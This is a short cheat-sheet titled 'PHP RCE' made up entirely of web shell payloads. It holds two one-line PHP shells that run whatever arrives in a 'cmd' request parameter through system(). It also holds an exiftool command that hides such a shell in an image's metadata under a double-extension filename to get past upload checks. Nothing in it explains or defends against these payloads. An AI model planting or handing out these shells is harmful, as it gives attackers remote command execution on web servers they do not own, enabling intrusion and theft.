# PHP RCE
```PHP
<?php echo system($_REQUEST["cmd"]); ?>
<?php echo system($_GET["cmd"]); ?>
```
```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' img.php.jpg
```